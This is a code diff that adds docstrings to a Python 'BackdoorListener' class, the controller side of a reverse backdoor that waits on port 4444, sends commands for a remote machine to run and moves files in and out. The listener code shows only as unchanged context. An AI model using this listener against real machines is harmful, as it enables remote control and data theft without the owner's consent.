@@ -11,20 +11,37 @@ import socket
 
 
 def read_file(path):
+    """Read contents of a binary file."""
     with open(path, "rb") as file:
         return base64.b64encode(file.read())
 
 
 def write_file(path, content):
+    """Write given contents to a binary file."""
     with open(path, "wb") as file:
         file.write(base64.b64decode(content))
         return "[+] Download successful."
 
 
-# TODO: Add documentation here.
 class BackdoorListener:
-    # TODO: apparently, IP address is not needed. Read more: https://docs.python.org/3/library/socket.html
+    """Create a socket awaiting connections from a reverse_backdoor.py script.
+
+    Attributes:
+        terminal - holds data from connected CLI
+        listener_socket - socket used to operate with network connections
+        connection - data about established connection between the listener_socked and external backdoor socket
+        address - address of the external connected device
+
+    Methods:
+        reliable_send(data) - send json dump over the connection
+        reliable_receive() - load and store json dump from the connection
+        execute_remotely(command) - send a command to execute on a remote device
+        run_command(command) - try to perform one of additional commands and print the result
+    """
+    # TODO note: IP address is not needed. Read more: https://docs.python.org/3/library/socket.html
     def __init__(self, ip_address: str, port: int = 4444):
+        """Initialize list for holding terminal data and a listener_socket,
+        which will await for incoming connection and store its data when successfully connected."""
         self.terminal = []
         listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -36,10 +53,12 @@ class BackdoorListener:
         print(f"[+] Connection established! Source: {address}.")
 
     def reliable_send(self, data: str):
+        """Send json dump over the connection."""
         json_data = json.dumps(data)
         self.connection.send(json_data.encode())
 
     def reliable_receive(self):
+        """Load and store json dump from the connection."""
         json_data = b""
         while True:
             try:
@@ -49,12 +68,14 @@ class BackdoorListener:
                 continue
 
     def execute_remotely(self, command):
+        """Send a command to execute on a remote device."""
         self.reliable_send(command)
         if command[0] == "exit":
             self.connection.close()
         return self.reliable_receive()
 
     def run_command(self, command):
+        """Try to perform one of additional commands or execute system command and print the result."""
         command = command.split()
 
         try:
